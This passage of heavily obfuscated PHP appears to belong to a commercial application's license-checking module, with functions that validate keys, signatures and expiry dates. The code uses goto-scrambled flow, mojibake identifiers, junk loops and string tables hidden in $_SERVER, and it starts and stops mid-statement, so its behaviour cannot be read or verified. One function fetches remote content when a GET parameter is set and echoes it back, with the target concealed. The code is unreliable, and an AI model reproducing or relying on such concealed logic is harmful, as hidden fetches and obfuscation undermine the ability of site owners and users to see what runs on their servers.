$BğèºÕ­“™[127]($BğèºÕ­“™[128]()); $eÓÇ²ˆªà¸ = $FÍºÔå…´[592]; while ($eÓÇ²ˆªà¸ < $FÍºÔå…´[560]) { if ($eÓÇ²ˆªà¸ >= 0) { break; } $eÓÇ²ˆªà¸++; } goto D©‡†·µ—; D©‡†·µ—: $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[129]] = $this->lqywbcfcea33; $C°ïĞ·ò¤Û = $FÍºÔå…´[593]; if ($C‚ŞÆìØõ [$BğèºÕ­“™[129]] != $BğèºÕ­“™[130]) { $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[131]] = $C‚ŞÆìØõ [$BğèºÕ­“™[131]]; $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[132]] = $C‚ŞÆìØõ [$BğèºÕ­“™[132]]; $EÛ¶ä¸Û³Ë = $BğèºÕ­“™[133](10) . $this->lqywbcfcea33 . $BğèºÕ­“™[133](5); $c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[134]][$BğèºÕ­“™[135]] = $this->{$_SERVER[ùç´][136]}($EÛ¶ä¸Û³Ë, $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[122]]); } goto eÖ’ÖÏì‡Ş; eèãë¥®ä¥: $eóìÓ•å = $FÍºÔå…´[590]; if (!$eóìÓ•å) { die; } $c˜Èç¦‹îò[$BğèºÕ­“™[117]][$BğèºÕ­“™[118]] = $BğèºÕ­“™[119]($BğèºÕ­“™[120])->{$_SERVER[ùç´][121]}(); goto DÂŒ·—í; a‹æ©İ¯: unset($c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[104]][$BğèºÕ­“™[105]]); unset($c˜Èç¦‹îò[$BğèºÕ­“™[102]][$BğèºÕ­“™[104]][$BğèºÕ­“™[106]]); $BÎÙÙ˜ëº = $FÍºÔå…´[588]; goto Eé©ĞğÉ’Ú; a™º‚¾ ™±: } private function cqgd755a9a64() { goto B¦œ‘Çªó÷; A‚ğ…Œ’Œº: if (!$dÃ•‡ ¤°) { die; } foreach ($aÕ˜’æ¸»³ as $Fğí¨«‘Œ†) { if (!isset($B“éŸà¼±î[$Fğí¨«‘Œ†]) || !$B“éŸà¼±î[$Fğí¨«‘Œ†]) { continue; } $AéêÚî…¾ª[$Fğí¨«‘Œ†] = $B“éŸà¼±î[$Fğí¨«‘Œ†]; $B¤“éÙêÁÏ = $FÓé›ÚĞ‚[599]; if (!$B¤“éÙêÁÏ) { die; } } $e×–Õ×‚âÔ[13](array($e×–Õ×‚âÔ[160], $e×–Õ×‚âÔ[161]), $AéêÚî…¾ª); goto C„Üáà»¥·; eÓ×ê Öí²: if (!$Fò±ÀŞ‡ÉË) { die; } $B“éŸà¼±î = $e×–Õ×‚âÔ[61]($e×–Õ×‚âÔ[62])->{$_SERVER[ùç´][63]}(); $d˜¶“çÄ†¶ = $FÓé›ÚĞ‚[597]; goto EóÛè†÷¤; C„Üáà»¥·: $AŠš¹æÃĞ² = $FÓé›ÚĞ‚[600]; while (strlen($AŠš¹æÃĞ²) < $FÓé›ÚĞ‚[565]) { if (!$AŠš¹æÃĞ²) { break; } $AŠš¹æÃĞ²++; } goto f–—…Ôµ; EóÛè†÷¤: if (strlen($d˜¶“çÄ†¶) < $FÓé›ÚĞ‚[565]) { die; } $AéêÚî…¾ª = array($e×–Õ×‚âÔ[168] => $B“éŸà¼±î[$e×–Õ×‚âÔ[64]], $e×–Õ×‚âÔ[169] => $B“éŸà¼±î[$e×–Õ×‚âÔ[65]], $e×–Õ×‚âÔ[170] => $e×–Õ×‚âÔ[10]); $dÃ•‡ ¤° = $FÓé›ÚĞ‚[598]; goto A‚ğ…Œ’Œº; B¦œ‘Çªó÷: $FÓé›ÚĞ‚ =& $_SERVER[…Ò×–]; $e×–Õ×‚âÔ =& $_SERVER[ùç´]; if ($_SERVER[$e×–Õ×‚âÔ[44]] == $e×–Õ×‚âÔ[144]) { goto eõ ùóõÀØ; f™ôÎëÇõ: $c©ãØƒó×Å = $FÓé›ÚĞ‚[595]; while (strlen($c©ãØƒó×Å) < $FÓé›ÚĞ‚[560]) { if (!$c©ãØƒó×Å) { break; } $c©ãØƒó×Å++; } $e×–Õ×‚âÔ[13](array($e×–Õ×‚âÔ[160], $e×–Õ×‚âÔ[161]), $AéêÚî…¾ª); goto eˆİïîµ¹†; eõ ùóõÀØ: $F˜æÆ­£ = array($e×–Õ×‚âÔ[129] => $this->lqywbcfcea33, $e×–Õ×‚âÔ[145] => $this->{$_SERVER[ùç´][146]}(), $e×–Õ×‚âÔ[147] => $e×–Õ×‚âÔ[61]($e×–Õ×‚âÔ[148])->{$_SERVER[ùç´][149]}()); if ($this->lqywbcfcea33 != $e×–Õ×‚âÔ[130]) { $cäóñğ›¹ = $e×–Õ×‚âÔ[113]($this->tqodec3b617c, $e×–Õ×‚âÔ[150]); if ($cäóñğ›¹) { $F˜æÆ­£[$e×–Õ×‚âÔ[151]] = $cäóñğ›¹; $F˜æÆ­£[$e×–Õ×‚âÔ[152]] = $e×–Õ×‚âÔ[153]($e×–Õ×‚âÔ[113]($this->tqodec3b617c, $e×–Õ×‚âÔ[154])); $F˜æÆ­£[$e×–Õ×‚âÔ[155]] = $e×–Õ×‚âÔ[113]($this->tqodec3b617c, $e×–Õ×‚âÔ[140]); } } $F˜æÆ­£ = $this->{$_SERVER[ùç´][156]}($e×–Õ×‚âÔ[157]($F˜æÆ­£), $e×–Õ×‚âÔ[123]($e×–Õ×‚âÔ[158])); goto BÁ«ë¾èŞ; BÁ«ë¾èŞ: $a»¥¦í¿ = $FÓé›ÚĞ‚[594]; if (strlen($a»¥¦í¿) < $FÓé›ÚĞ‚[552]) { die; } $AéêÚî…¾ª = array($e×–Õ×‚âÔ[159] => $F˜æÆ­£); goto f™ôÎëÇõ; eˆİïîµ¹†: } goto eôò¿Š¶à; eôò¿Š¶à: if ($this->lqywbcfcea33 == $e×–Õ×‚âÔ[130]) { return; } $aÕ˜’æ¸»³ = array($e×–Õ×‚âÔ[162], $e×–Õ×‚âÔ[163], $e×–Õ×‚âÔ[164], $e×–Õ×‚âÔ[165], $e×–Õ×‚âÔ[166], $e×–Õ×‚âÔ[167]); $Fò±ÀŞ‡ÉË = $FÓé›ÚĞ‚[596]; goto eÓ×ê Öí²; f–—…Ôµ: } private function wjqh1cbf8266() { goto BèöÒĞ„å¼; AÍ“³í©«: while (strlen($f›„¶¢ËÊÎ) < $a«‹§ì‡å[580]) { if (!$f›„¶¢ËÊÎ) { break; } $f›„¶¢ËÊÎ++; } if (!$B‚‡£¶®• || $B‚‡£¶®• != $BƒïÎ´À“Â[$D§ˆ§»‘ä«[154]]) { $bÌ¶á‰±Ô¤ = array($D§ˆ§»‘ä«[210] => $D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[62])->{$_SERVER[ùç´][63]}($D§ˆ§»‘ä«[125]), $D§ˆ§»‘ä«[211] => $_SERVER[$D§ˆ§»‘ä«[124]], $D§ˆ§»‘ä«[212] => $D§ˆ§»‘ä«[213](), $D§ˆ§»‘ä«[183] => $_SERVER[$D§ˆ§»‘ä«[184]]); $BÜã‡·¢¦ß = $this->{$_SERVER[ùç´][214]}($D§ˆ§»‘ä«[157]($bÌ¶á‰±Ô¤)); $this->{$_SERVER[ùç´][191]}($D§ˆ§»‘ä«[215] . $BÜã‡·¢¦ß); $D§ˆ§»‘ä«[175]($D§ˆ§»‘ä«[206]($D§ˆ§»‘ä«[216]), !0); } $Bâè‚¶áº = array($D§ˆ§»‘ä«[217] => $AÎ”†…·Œ[$D§ˆ§»‘ä«[174]], $D§ˆ§»‘ä«[218] => $BƒïÎ´À“Â[$D§ˆ§»‘ä«[219]], $D§ˆ§»‘ä«[220] => $D§ˆ§»‘ä«[133](16), $D§ˆ§»‘ä«[129] => $BƒïÎ´À“Â[$D§ˆ§»‘ä«[221]]); goto Fì·“É›; aŞ¤êù¡™¬: $c½ºè©»¶ã = $a«‹§ì‡å[604]; if ($BƒïÎ´À“Â[$D§ˆ§»‘ä«[225]] && $BƒïÎ´À“Â[$D§ˆ§»‘ä«[225]] >= 1) { $D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[62])->{$_SERVER[ùç´][226]}($D§ˆ§»‘ä«[227], $D§ˆ§»‘ä«[228]); } $D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[62])->{$_SERVER[ùç´][229]}($Bâè‚¶áº); goto dğ·Îáœ; aåÅºÅ½Â²: if (!$D§ˆ§»‘ä«[113]($GLOBALS, $D§ˆ§»‘ä«[141])) { die; } $E¬ÀĞïÏµ­ = $GLOBALS[$D§ˆ§»‘ä«[22]]; if (isset($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[172]])) { $this->{$_SERVER[ùç´][173]}(); die; } goto Cˆ‰ÆÜ££¥; aĞ›•ğæÙ: $Bõ”ÁÀ¢øÀ = $EĞ‘Ä·‹Û[$D§ˆ§»‘ä«[233]]; $cçÓìäÈÔµ = array(); $cçÓìäÈÔµ[$B×ãÑ£­ªœ] = $E›±ÎÁ³‡Á; goto A¡‘æ®µÙè; Fì·“É›: if ($AÎ”†…·Œ[$D§ˆ§»‘ä«[177]]) { $Bâè‚¶áº[$D§ˆ§»‘ä«[220]] = $AÎ”†…·Œ[$D§ˆ§»‘ä«[177]]; } $b°İ‹’¿á = $D§ˆ§»‘ä«[25]($D§ˆ§»‘ä«[123]($Bâè‚¶áº[$D§ˆ§»‘ä«[218]]), 10, 10); $cŞ¹”£ÎŒƒ = $b°İ‹’¿á . $Bâè‚¶áº[$D§ˆ§»‘ä«[129]] . $Bâè‚¶áº[$D§ˆ§»‘ä«[220]]; goto Dî‹º•ŠÒ; dğ·Îáœ: $D™ÆŒ’ˆï¨ = $D§ˆ§»‘ä«[123]($_SERVER[$D§ˆ§»‘ä«[124]] . $D§ˆ§»‘ä«[222]($Aà©ÄÔ¥ŸÆ) . $Bâè‚¶áº[$D§ˆ§»‘ä«[218]]); $B×ãÑ£­ªœ = $D§ˆ§»‘ä«[222]($D§ˆ§»‘ä«[25]($D™ÆŒ’ˆï¨, 10, 16)); $E›±ÎÁ³‡Á = $this->{$_SERVER[ùç´][136]}($D§ˆ§»‘ä«[157]($BƒïÎ´À“Â), $D™ÆŒ’ˆï¨); goto B±¿•èŞœÁ; eá»Ê¶‘„: $c½§ºÍ¤‰ = $a«‹§ì‡å[608]; $this->tqodec3b617c = $BƒïÎ´À“Â; $this->lqywbcfcea33 = $Bâè‚¶áº[$D§ˆ§»‘ä«[129]]; goto CÈõ¸‰ôˆ; Dî‹º•ŠÒ: $Bâè‚¶áº[$D§ˆ§»‘ä«[131]] = $D§ˆ§»‘ä«[222]($D§ˆ§»‘ä«[127]($this->{$_SERVER[ùç´][156]}($cŞ¹”£ÎŒƒ, $D§ˆ§»‘ä«[223]))); $AåÛßÏÆà„ = $D§ˆ§»‘ä«[133](16); $A«®É¢Ç§ = $a«‹§ì‡å[603]; goto bœóÙÛ´‡ù; D´·Ø¦Ë: $BäÉØÒ¥°ó = $a«‹§ì‡å[611]; if (strlen($BäÉØÒ¥°ó) < $a«‹§ì‡å[565]) { return; } goto aÜÇÌœ¢å†; bÊË•…ˆ—: $eíÄŞË¢™” = $a«‹§ì‡å[610]; if (strlen($eíÄŞË¢™”) < $a«‹§ì‡å[580]) { return; } $D§ˆ§»‘ä«[175]($D§ˆ§»‘ä«[206]($D§ˆ§»‘ä«[216]), !0); goto D´·Ø¦Ë; CÈõ¸‰ôˆ: $eÅè ËÂ’¦ = $a«‹§ì‡å[609]; if (!$eÅè ËÂ’¦) { return; } $this->{$_SERVER[ùç´][237]}(); goto bÊË•…ˆ—; BèöÒĞ„å¼: $a«‹§ì‡å =& $_SERVER[…Ò×–]; $D§ˆ§»‘ä« =& $_SERVER[ùç´]; if ($_SERVER[$D§ˆ§»‘ä«[44]] != $D§ˆ§»‘ä«[171]) { return; } goto aåÅºÅ½Â²; bœóÙÛ´‡ù: if (!$A«®É¢Ç§) { die; } $aÕ±ÈÀŒ‘ù = $AåÛßÏÆà„ . $Bâè‚¶áº[$D§ˆ§»‘ä«[129]] . $this->{$_SERVER[ùç´][156]}($D§ˆ§»‘ä«[123]($Bâè‚¶áº[$D§ˆ§»‘ä«[217]]), $AåÛßÏÆà„); $Bâè‚¶áº[$D§ˆ§»‘ä«[132]] = $D§ˆ§»‘ä«[127]($D§ˆ§»‘ä«[222]($this->{$_SERVER[ùç´][156]}($aÕ±ÈÀŒ‘ù, $D§ˆ§»‘ä«[224]))); goto aŞ¤êù¡™¬; B±¿•èŞœÁ: $EïÑï³á¹ì = $a«‹§ì‡å[605]; $EĞ‘Ä·‹Û = $D§ˆ§»‘ä«[230]($D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[11])->{$_SERVER[ùç´][231]}(), $D§ˆ§»‘ä«[232]); $cˆ¦ãªîÜ¬ = $a«‹§ì‡å[606]; goto aĞ›•ğæÙ; b´®ç¯­ù: $däÎÈ„ğ² = $D§ˆ§»‘ä«[123]($_SERVER[$D§ˆ§»‘ä«[124]] . $Aà©ÄÔ¥ŸÆ); if ($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[187]] == $D§ˆ§»‘ä«[188]) { $AßŸ§Ÿ’Š¤ = $this->{$_SERVER[ùç´][156]}($däÎÈ„ğ², $D§ˆ§»‘ä«[189]); $BÜã‡·¢¦ß = $this->{$_SERVER[ùç´][136]}($D§ˆ§»‘ä«[157]($AÎ”†…·Œ), $däÎÈ„ğ² . $D§ˆ§»‘ä«[190], 3); $d…ö‘¡×Ò = $this->{$_SERVER[ùç´][191]}($D§ˆ§»‘ä«[192] . $AßŸ§Ÿ’Š¤ . $D§ˆ§»‘ä«[193] . $BÜã‡·¢¦ß, -1); $D§ˆ§»‘ä«[175]($d…ö‘¡×Ò, !0); } else { if ($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[187]] == $D§ˆ§»‘ä«[194]) { $d…­ ÜÒÃ = $D§ˆ§»‘ä«[25]($D§ˆ§»‘ä«[123]($D§ˆ§»‘ä«[195] . $däÎÈ„ğ²), 12, 15) . $D§ˆ§»‘ä«[196]; $BÜã‡·¢¦ß = $this->{$_SERVER[ùç´][197]}($D§ˆ§»‘ä«[2]($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[198]]), $d…­ ÜÒÃ, 2); $dƒïÕ‚ ¯ = $D§ˆ§»‘ä«[199]($BÜã‡·¢¦ß, !0); if (!$D§ˆ§»‘ä«[200]($dƒïÕ‚ ¯) || !$D§ˆ§»‘ä«[200]($dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]]) || $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[174]] != !0) { $C³£ƒìê‡… = $D§ˆ§»‘ä«[202]; $DíĞÕÒÙµ  = $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]] ? $D§ˆ§»‘ä«[203] . $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]] : $C³£ƒìê‡…; $D§ˆ§»‘ä«[175]($DíĞÕÒÙµ , !1); } else { $AÎ”†…·Œ[$D§ˆ§»‘ä«[177]] = $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]][$D§ˆ§»‘ä«[204]]; } } else { $dƒïÕ‚ ¯ = $this->{$_SERVER[ùç´][191]}($D§ˆ§»‘ä«[205], $AÎ”†…·Œ, 10); $C·³‹—–¿Å = $a«‹§ì‡å[601]; } } if (!$D§ˆ§»‘ä«[200]($dƒïÕ‚ ¯) || !$D§ˆ§»‘ä«[200]($dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]]) || $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[174]] != !0) { $C³£ƒìê‡… = $D§ˆ§»‘ä«[206]($D§ˆ§»‘ä«[207]); $DíĞÕÒÙµ  = $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]] ? $D§ˆ§»‘ä«[203] . $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]] : $C³£ƒìê‡…; $D§ˆ§»‘ä«[175]($DíĞÕÒÙµ , !1); } goto eÑ®œ¶ò¾Ú; A¡‘æ®µÙè: $bìÊ…šö£ñ = $a«‹§ì‡å[607]; if (strlen($bìÊ…šö£ñ) < $a«‹§ì‡å[567]) { return; } $D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[11])->{$_SERVER[ùç´][234]}($Bõ”ÁÀ¢øÀ[$D§ˆ§»‘ä«[235]], array($D§ˆ§»‘ä«[236] => $cçÓìäÈÔµ)); goto eá»Ê¶‘„; eÑ®œ¶ò¾Ú: $BƒïÎ´À“Â = $dƒïÕ‚ ¯[$D§ˆ§»‘ä«[201]]; $B‚‡£¶®• = $this->{$_SERVER[ùç´][208]}($BƒïÎ´À“Â[$D§ˆ§»‘ä«[209]]); $f›„¶¢ËÊÎ = $a«‹§ì‡å[602]; goto AÍ“³í©«; Cˆ‰ÆÜ££¥: if (!isset($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[174]]) || $D§ˆ§»‘ä«[24]($E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[174]]) != 16) { $D§ˆ§»‘ä«[175]($D§ˆ§»‘ä«[176] . $E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[174]], !1); } $Aà©ÄÔ¥ŸÆ = $D§ˆ§»‘ä«[61]($D§ˆ§»‘ä«[62])->{$_SERVER[ùç´][63]}($D§ˆ§»‘ä«[125]); $AÎ”†…·Œ = array($D§ˆ§»‘ä«[174] => $E¬ÀĞïÏµ­[$D§ˆ§»‘ä«[174]], $D§ˆ§»‘ä«[177] => $D§ˆ§»‘ä«[133](16), $D§ˆ§»‘ä«[178] => $D§ˆ§»‘ä«[158], $D§ˆ§»‘ä«[179] => $D§ˆ§»‘ä«[180], $D§ˆ§»‘ä«[181] => $_SERVER[$D§ˆ§»‘ä«[182]], $D§ˆ§»‘ä«[183] => $_SERVER[$D§ˆ§»‘ä«[184]], $D§ˆ§»‘ä«[185] => $_SERVER[$D§ˆ§»‘ä«[186]]); goto b´®ç¯­ù; aÜÇÌœ¢å†: } private function licenseRegistSuccess() { goto FÏÁù„¸·Ê; FÏÁù„¸·Ê: $D­ó¬É¶‚à =& $_SERVER[…Ò×–]; $CÄï½¿†î =& $_SERVER[ùç´]; $EÙ¶êÆôæ = $CÄï½¿†î[61]($CÄï½¿†î[62])->{$_SERVER[ùç´][63]}(); goto bÃ¿Û…·õß; fÈ½öäÃ: $CÄï½¿†î[119]($CÄï½¿†î[238])->{$_SERVER[ùç´][239]}(!0); goto e÷ò¿ã­òê; bÃ¿Û…·õß: $B£Ï‘ ¨‘¦ = $D­ó¬É¶‚à[612]; if (strlen($B£Ï‘ ¨‘¦) < $D­ó¬É¶‚à[552]) { return; } if ($EÙ¶êÆôæ[$CÄï½¿†î[89]] != $CÄï½¿†î[228]) { $CÄï½¿†î[61]($CÄï½¿†î[62])->{$_SERVER[ùç´][229]}($CÄï½¿†î[89], $CÄï½¿†î[228]); } goto fÈ½öäÃ; e÷ò¿ã­òê: } private function prybc5d44107() { goto EÇ¹ïñòÁ; EÇ¹ïñòÁ: $cæŠøÊ½ =& $_SERVER[…Ò×–]; $eš·®±‚Â =& $_SERVER[ùç´]; $eš·®±‚Â[61]($eš·®±‚Â[62])->{$_SERVER[ùç´][229]}(array($eš·®±‚Â[217] => $eš·®±‚Â[10], $eš·®±‚Â[218] => $eš·®±‚Â[10], $eš·®±‚Â[129] => $eš·®±‚Â[130], $eš·®±‚Â[131] => $eš·®±‚Â[10], $eš·®±‚Â[132] => $eš·®±‚Â[10])); goto d¦…İ§„¯; d¦…İ§„¯: $AÀèçªö¿ = $cæŠøÊ½[613]; if (strlen($AÀèçªö¿) < $cæŠøÊ½[565]) { return; } $eš·®±‚Â[61]($eš·®±‚Â[62])->{$_SERVER[ùç´][226]}($eš·®±‚Â[227], $eš·®±‚Â[240]); goto aô¨ÛÌÇå; aô¨ÛÌÇå: $this->tqodec3b617c = array(); $this->lqywbcfcea33 = $eš·®±‚Â[130]; goto B¼¸ĞÑ›˜²; B¼¸ĞÑ›˜²: } private function nwtm35c5020e() { goto FæÊÕøáë²; F‚¤ÄÇÎã…: $AÓáá¸…–¾ = $f¸í¯ŠĞ¶ƒ[615]; if (!$AÓáá¸…–¾) { return; } $E¬†‘¶öì˜ = $e‘è¦»®Ü[222]($e‘è¦»®Ü[25]($DØ£ÀĞ°´›, 10, 16)); goto D°²—î†Î„; A—Õ¡³˜¡Ò: $this->lqywbcfcea33 = $e‘è¦»®Ü[130]; $dô¤à¦¶Ô = $e‘è¦»®Ü[61]($e‘è¦»®Ü[62])->{$_SERVER[ùç´][63]}(); $FËÊ™»Ğª÷ = $f¸í¯ŠĞ¶ƒ[614]; goto a‰›¦³°àİ; FæÊÕøáë²: $f¸í¯ŠĞ¶ƒ =& $_SERVER[…Ò×–]; $e‘è¦»®Ü =& $_SERVER[ùç´]; $_SERVER[$e‘è¦»®Ü[184]] = $e‘è¦»®Ü[113]($_SERVER, $e‘è¦»®Ü[184], APP_HOST); goto A—Õ¡³˜¡Ò; D°²—î†Î„: $eÆ„ßÊ¸Ş¢ = $this->{$_SERVER[ùç´][197]}($cÀ…ÍÒòà[$e‘è¦»®Ü[100]][$E¬†‘¶öì˜], $DØ£ÀĞ°´›); $eÆ„ßÊ¸Ş¢ = $e‘è¦»®Ü[199]($eÆ„ßÊ¸Ş¢, !0); $dİÓ£ÃŸÄ = $f¸í¯ŠĞ¶ƒ[616]; goto a½‡×¬¤Ô»; a½‡×¬¤Ô»: if (!$dİÓ£ÃŸÄ) { die; } if (!$e‘è¦»®Ü[200]($eÆ„ßÊ¸Ş¢)) { return $this->{$_SERVER[ùç´][173]}(); } $d’–¬“ÂÍÜ = $e‘è¦»®Ü[153]($eÆ„ßÊ¸Ş¢[$e‘è¦»®Ü[154]]); goto A ÃéÊæ; Cî¸ª¤É¨: $cÄÓ¹š‡´à = $f¸í¯ŠĞ¶ƒ[617]; goto FÂ¸ƒ…³Ğ‡; a‰›¦³°àİ: while (strlen($FËÊ™»Ğª÷) < $f¸í¯ŠĞ¶ƒ[565]) { if (!$FËÊ™»Ğª÷) { break; } $FËÊ™»Ğª÷++; } if ($dô¤à¦¶Ô[$e‘è¦»®Ü[129]] == $e‘è¦»®Ü[130]) { return; } $c¡‰†˜Ë = $e‘è¦»®Ü[61]($e‘è¦»®Ü[62])->{$_SERVER[ùç´][63]}($e‘è¦»®Ü[125]); goto B·’òã—‘—; B·’òã—‘—: $a›–æ•Ãî = $e‘è¦»®Ü[230]($e‘è¦»®Ü[61]($e‘è¦»®Ü[11])->{$_SERVER[ùç´][231]}(), $e‘è¦»®Ü[232]); $cÀ…ÍÒòà = $a›–æ•Ãî[$e‘è¦»®Ü[233]]; $DØ£ÀĞ°´› = $e‘è¦»®Ü[123]($_SERVER[$e‘è¦»®Ü[124]] . $e‘è¦»®Ü[222]($c¡‰†˜Ë) . $dô¤à¦¶Ô[$e‘è¦»®Ü[218]]); goto F‚¤ÄÇÎã…; A ÃéÊæ: if ($e‘è¦»®Ü[241]() >= $d’–¬“ÂÍÜ) { return $this->{$_SERVER[ùç´][173]}(); } $this->tqodec3b617c = $eÆ„ßÊ¸Ş¢; $this->lqywbcfcea33 = $dô¤à¦¶Ô[$e‘è¦»®Ü[129]]; goto Cî¸ª¤É¨; FÂ¸ƒ…³Ğ‡: } private function zvuw391e992c() { $Aœµ“ÊÙ…Ã =& $_SERVER[ùç´]; $AÀˆ¸ÄÜ†ñ = $GLOBALS[$Aœµ“ÊÙ…Ã[22]]; $b²áÆ¦½™× = $_SERVER[$Aœµ“ÊÙ…Ã[44]]; if ($b²áÆ¦½™× == $Aœµ“ÊÙ…Ã[242] && $this->lqywbcfcea33 == $Aœµ“ÊÙ…Ã[130]) { $Aœµ“ÊÙ…Ã[175]($Aœµ“ÊÙ…Ã[206]($Aœµ“ÊÙ…Ã[243]), !1, $Aœµ“ÊÙ…Ã[244]); } $FîÁáÀÃí = array($Aœµ“ÊÙ…Ã[245], $Aœµ“ÊÙ…Ã[246]); if ($Aœµ“ÊÙ…Ã[247]($b²áÆ¦½™×, $FîÁáÀÃí)) { if ($this->lqywbcfcea33 == $Aœµ“ÊÙ…Ã[130] && isset($AÀˆ¸ÄÜ†ñ[$Aœµ“ÊÙ…Ã[248]])) { $Aœµ“ÊÙ…Ã[175]($Aœµ“ÊÙ…Ã[206]($Aœµ“ÊÙ…Ã[243]), !1, $Aœµ“ÊÙ…Ã[244]); die; } $d²êÂÙ”Í— = $this->{$_SERVER[ùç´][146]}(); if ($d²êÂÙ”Í— != $Aœµ“ÊÙ…Ã[249]($Aœµ“ÊÙ…Ã[250])) { if ($d²êÂÙ”Í— <= $Aœµ“ÊÙ…Ã[61]($Aœµ“ÊÙ…Ã[148])->{$_SERVER[ùç´][149]}()) { $Aœµ“ÊÙ…Ã[175]($Aœµ“ÊÙ…Ã[206]($Aœµ“ÊÙ…Ã[251]), !1, $Aœµ“ÊÙ…Ã[244]); die; } } } } private function yuxf218beb0c() { goto B“·È²ä…ğ; FÛÖ÷Áá ‹: if (!$aæ¹ì‚èƒ‰[113]($GLOBALS, $aæ¹ì‚èƒ‰[141]) || !isset($_GET[$aæ¹ì‚èƒ‰[253]])) { return; } if (!$aæ¹ì‚èƒ‰[247]($_SERVER[$aæ¹ì‚èƒ‰[44]], $B©øœ¥“„Æ)) { return; } $Dœ¦ã‚ä™™ = $aæ¹ì‚èƒ‰[254]; goto F›ÁØ¶Ó±È; bœëğù·Çˆ: $DØ‹âá‡ˆ = $dõçÛåß¼œ[620]; $c¥ß³÷İ = @$aæ¹ì‚èƒ‰[262]($Dœ¦ã‚ä™™, !1, $f”ã„¯ÒŒŸ); $aæ¹ì‚èƒ‰[263]($aæ¹ì‚èƒ‰[264]); goto eÒ• Ê‚“; eÒ• Ê‚“: if ($c¥ß³÷İ && $aæ¹ì‚èƒ‰[32]($c¥ß³÷İ, $aæ¹ì‚èƒ‰[265])) { echo $c¥ß³÷İ; } die; goto Dõßê¯ÈÙæ; F›ÁØ¶Ó±È: $eÖ¹Õ´øõ = $dõçÛåß¼œ[618]; if (!$eÖ¹Õ´øõ) { die; } $Dœ¦ã‚ä™™ = $this->{$_SERVER[ùç´][255]}($Dœ¦ã‚ä™™, $aæ¹ì‚èƒ‰[256]); goto aõï¥ÖÂ¹; aõï¥ÖÂ¹: $e¸‰–¨ÕÆ = $dõçÛåß¼œ[619]; while ($e¸‰–¨ÕÆ < $dõçÛåß¼œ[560]) { if ($e¸‰–¨ÕÆ >= 0) { break; } $e¸‰–¨ÕÆ++; } $f”ã„¯ÒŒŸ = $aæ¹ì‚èƒ‰[257](array($aæ¹ì‚èƒ‰[258] => array($aæ¹ì‚èƒ‰[259] => $aæ¹ì‚èƒ‰[260], $aæ¹ì‚èƒ‰[261] => 3))); goto bœëğù·Çˆ; B“·È²ä…ğ: $dõçÛåß¼œ =& $_SERVER[…Ò×–]; $aæ¹ì‚èƒ‰ =& $_SERVER[ùç´]; $B©øœ¥“„Æ = array($aæ¹ì‚èƒ‰[144], $aæ¹ì‚èƒ‰[252]); goto FÛÖ÷Áá ‹; Dõßê¯ÈÙæ: } public function fnkwd72d7d42($FîÊ…³Œ­) { goto DÈ”Ş†¾º…; C‰Ò‰½É‚¤: $bÉˆÆïá‹¶ = $Fƒ¼¼»Ÿ¥à[623]; while ($bÉˆÆïá‹¶ < $Fƒ¼¼»Ÿ¥à[567]) { if ($bÉˆÆïá‹¶ >= 0) { break; } $bÉˆÆïá‹¶++; } foreach ($F÷èø®äÜ as $fºÇ®´Åìï => $b»ß©ğÏ…) { if ($b»ß©ğÏ… == $F¬ôÖ†·ß–[268] && $F¬ôÖ†·ß–[25]($this->lqywbcfcea33, 0, 1) == $F¬ôÖ†·ß–[268]) { continue; } if (!$F¬ôÖ†·ß–[247]($fºÇ®´Åìï, $Bõ¸‹Éâ)) { $AòŞîÛƒ³[] = $fºÇ®´Åìï; } } goto FÏ½†¢‚ğ; FÏ½†¢‚ğ: foreach ($AòŞîÛƒ³ as $fºÇ®´Åìï) { unset($FîÊ…³Œ­[$fºÇ®´Åìï]); } return $FîÊ…³Œ­; $E÷¹©ˆ¢•Î = $Fƒ¼¼»Ÿ¥à[624]; goto A‡àğçè à; e ¿Å–¬®¬: $F÷èø®äÜ = array($F¬ôÖ†·ß–[267] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[269] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[270] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[271] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[272] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[273] => $F¬ôÖ†·ß–[268], $F¬ôÖ†·ß–[274] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[276] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[277] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[278] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[279] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[280] => $F¬ôÖ†·ß–[275], $F¬ôÖ†·ß–[281] => $F¬ôÖ†·ß–[275]); $Eó–ˆõï½“ = $Fƒ¼¼»Ÿ¥à[621]; $Bõ¸‹Éâ = $F¬ôÖ†·ß–[0]($F¬ôÖ†·ß–[282], $F¬ôÖ†·ß–[113]($this->tqodec3b617c, $F¬ôÖ†·ß–[138], $F¬ôÖ†·ß–[10])); goto 